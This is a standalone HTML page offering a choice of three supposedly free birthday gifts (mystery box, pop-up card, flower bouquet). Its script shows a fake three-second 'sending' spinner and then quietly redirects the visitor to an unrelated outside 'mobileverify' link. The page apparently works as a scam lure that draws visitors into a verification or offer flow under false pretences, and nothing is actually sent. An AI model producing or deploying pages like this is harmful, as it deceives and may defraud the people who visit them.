<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Select a Birthday Gift</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        /* Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            font-family: 'Roboto', sans-serif;
            background-color: #121212;
            color: #e0e0e0;
        }

        /* Page Title */
        .page-title {
            text-align: center;
            font-size: 24px;
            font-weight: 500;
            margin: 50px 0 30px; /* Increased spacing for breathing room */
            color: #ffeb3b;
        }

        /* Gift Grid */
        .gift-grid {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 20px;
            padding: 20px;
        }

        .gift-card {
            background-color: #1f1f1f;
            border-radius: 10px;
            overflow: hidden;
            width: 300px;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            position: relative;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .gift-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.7);
        }

        .gift-card img {
            width: 100%;
            height: 200px;
            object-fit: cover;
        }

        .gift-card .gift-info {
            padding: 15px;
        }

        .gift-card .gift-title {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #e0e0e0;
        }

        .gift-card .gift-price {
            font-size: 16px;
            font-weight: 400;
            color: #66bb6a;
        }

        /* Radio Button */
        .gift-card input[type="radio"] {
            display: none;
        }

        .gift-card.selected {
            border: 2px solid #1e90ff;
        }

        /* Send Button */
        .send-button {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 50px auto 80px; /* Added more space at the bottom */
            padding: 12px 30px;
            background-color: #ff5722;
            color: #ffffff;
            font-size: 18px;
            font-weight: 500;
            text-transform: capitalize;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3); /* Floating effect */
        }

        .send-button:hover {
            background-color: #e64a19;
            transform: translateY(-2px);
        }

        .send-button[disabled] {
            cursor: not-allowed;
            opacity: 0.5;
        }

        .send-button .icon {
            font-size: 20px;
            margin-right: 8px;
        }

        .send-button .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid transparent;
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        /* Smooth Scrolling */
        html {
            scroll-behavior: smooth;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .gift-card {
                width: 90%;
            }

            .send-button {
                margin: 40px auto 70px; /* More bottom margin for mobile */
            }

            .page-title {
                font-size: 22px;
                margin: 40px 0 20px; /* Adjusted spacing for smaller screens */
            }
        }
    </style>
</head>
<body>

<!-- Page Title --></br>
<h1 class="page-title">Select a Birthday Gift üéÅ</h1>

<!-- Gift Grid -->
<div class="gift-grid">
    <!-- Gift 1 -->
    <label class="gift-card">
        <input type="radio" name="gift" value="mystery-box">
        <img src="birthday mystery box.jpg" alt="Birthday Mystery Box">
        <div class="gift-info">
            <div class="gift-title">Birthday Mystery Box</div>
            <div class="gift-price">Free</div>
        </div>
    </label>

    <!-- Gift 2 -->
    <label class="gift-card">
        <input type="radio" name="gift" value="pop-up-card">
        <img src="Birthday Pop-Up Card.jpg" alt="Birthday Pop-Up Card">
        <div class="gift-info">
            <div class="gift-title">Birthday Pop-Up Card</div>
            <div class="gift-price">Free</div>
        </div>
    </label>

    <!-- Gift 3 -->
    <label class="gift-card">
        <input type="radio" name="gift" value="flower-bouquet">
        <img src="flower.webp" alt="Birthday Flower Bouquet">
        <div class="gift-info">
            <div class="gift-title">Birthday Flower Bouquet</div>
            <div class="gift-price">Free</div>
        </div>
    </label>
</div>

<!-- Send Button -->
<button class="send-button" id="sendButton" disabled>
  Send Birthday Gift <span class="material-icons icon" style="margin-left: 8px;">send</span>
  <span class="spinner" id="spinner"></span>
</button>
</br>

<script>
    // DOM Elements
    const giftCards = document.querySelectorAll('.gift-card');
    const sendButton = document.getElementById('sendButton');
    const spinner = document.getElementById('spinner');

    // Handle Gift Selection
    giftCards.forEach(card => {
        const radio = card.querySelector('input[type="radio"]');
        card.addEventListener('click', () => {
            // Deselect other cards
            giftCards.forEach(c => c.classList.remove('selected'));
            // Select the current card
            card.classList.add('selected');
            radio.checked = true;
            // Enable the Send Button
            sendButton.disabled = false;

            // Scroll to the Send Button after a slight delay
            setTimeout(() => {
                sendButton.scrollIntoView({ behavior: 'smooth' });
            }, 500);
        });
    });

    // Handle Send Button Click
    sendButton.addEventListener('click', () => {
        // Show spinner
        spinner.style.display = 'inline-block';
        sendButton.disabled = true;

        // Simulate loading
        setTimeout(() => {
            window.location.href = 'https://mobileverify.net/cl/i/voxveg';
        }, 3000); // Wait for 3 seconds
    });
</script>

</body>
</html>
